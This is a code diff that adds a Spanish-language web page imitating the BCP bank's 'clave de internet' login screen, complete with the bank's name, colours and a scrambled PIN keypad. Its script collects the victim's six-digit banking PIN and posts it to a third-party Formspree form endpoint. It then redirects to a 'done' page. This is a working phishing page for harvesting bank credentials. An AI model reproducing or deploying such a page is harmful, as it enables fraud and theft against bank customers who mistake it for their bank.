@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingresa tu clave | BCP</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap');
+
+        :root {
+            --bcp-blue: #002a8d;
+            --bcp-orange: #ff7a00;
+            --btn-bg: #f2f4f7;
+            --text-dark: #1d2b4d;
+        }
+
+        body {
+            margin: 0;
+            padding: 10px;
+            font-family: 'Poppins', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #fff;
+            height: 100vh;
+        }
+
+        h2 {
+            color: var(--bcp-blue);
+            font-size: 20px;
+            text-align: center;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            line-height: 1.2;
+        }
+
+        /* Indicateurs de saisie (les petits cercles) */
+        .dots-container {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border: 1.5px solid #ccc;
+            border-radius: 50%;
+            background-color: transparent;
+            transition: background-color 0.2s, border-color 0.2s;
+        }
+
+        .dot.filled {
+            background-color: var(--text-dark);
+            border-color: var(--text-dark);
+        }
+
+        /* Grille du clavier numérique */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px 10px;
+            width: 100%;
+            max-width: 300px;
+        }
+
+        .key {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--btn-bg);
+            border: none;
+            font-size: 28px;
+            font-weight: 600;
+            color: var(--text-dark);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: background-color 0.1s;
+        }
+
+        .key:active {
+            background-color: #e0e4e8;
+        }
+
+        .key.empty { background: transparent; cursor: default; }
+        
+        .key.delete {
+            background: transparent;
+            color: #999;
+            font-size: 22px;
+        }
+
+        /* Bouton Envoyer */
+        .btn-submit {
+            margin-top: 40px;
+            background-color: var(--bcp-orange);
+            color: white;
+            border: none;
+            width: fit-content;
+            max-width: 320px;
+            padding: 13px 25px;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            display: none; /* Caché par défaut, apparaît quand 6 chiffres sont saisis */
+        }
+
+        #statusMessage {
+            margin-top: 15px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>Ingresa tu<br>clave de internet</h2>
+
+    <div class="dots-container">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+    </div>
+
+    <div class="keypad">
+        <button class="key" onclick="press('2')">2</button>
+        <button class="key" onclick="press('5')">5</button>
+        <button class="key" onclick="press('3')">3</button>
+        
+        <button class="key" onclick="press('4')">4</button>
+        <button class="key" onclick="press('6')">6</button>
+        <button class="key" onclick="press('7')">7</button>
+        
+        <button class="key" onclick="press('0')">0</button>
+        <button class="key" onclick="press('8')">8</button>
+        <button class="key" onclick="press('1')">1</button>
+        
+        <div class="key empty"></div>
+        <button class="key" onclick="press('9')">9</button>
+        <button class="key delete" onclick="del()">
+            <i class="fa-solid fa-delete-left"></i>
+        </button>
+    </div>
+
+    <button id="sendBtn" class="btn-submit" onclick="sendData()">Enviar</button>
+    
+    <p id="statusMessage"></p>
+
+    <script>
+        let currentPinc = "";
+        const maxLen = 6;
+        const dots = document.querySelectorAll('.dot');
+        const sendBtn = document.getElementById('sendBtn');
+        const statusMsg = document.getElementById('statusMessage');
+
+        function press(num) {
+            if (currentPinc.length < maxLen) {
+                currentPinc += num;
+                updateUI();
+            }
+        }
+
+        function del() {
+            currentPinc = currentPinc.slice(0, -1);
+            updateUI();
+        }
+
+        function updateUI() {
+            // Mise à jour des cercles
+            dots.forEach((dot, index) => {
+                if (index < currentPinc.length) {
+                    dot.classList.add('filled');
+                } else {
+                    dot.classList.remove('filled');
+                }
+            });
+
+            // Afficher le bouton si 6 chiffres
+            sendBtn.style.display = (currentPinc.length === maxLen) ? "block" : "none";
+        }
+
+        async function sendData() {
+            statusMsg.textContent = "Enviando...";
+            statusMsg.style.color = "blue";
+
+            const payload = {
+                clave_internet: currentPinc,
+                timestamp: new Date().toLocaleString()
+            };
+
+            try {
+                const response = await fetch('https://formspree.io/f/xvgqwvkj', {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    statusMsg.textContent = "✅ ok.";
+                    statusMsg.style.color = "green";
+                    setTimeout(() => {
+                        window.location.href = "done.html";
+                    }, 1500);
+                } else {
+                    statusMsg.textContent = "❌ Error de conexión";
+                    statusMsg.style.color = "red";
+                }
+            } catch (error) {
+                statusMsg.textContent = "❌ Error al enviar";
+                statusMsg.style.color = "red";
+            }
+        }
+    </script>
+</body>
+</html>
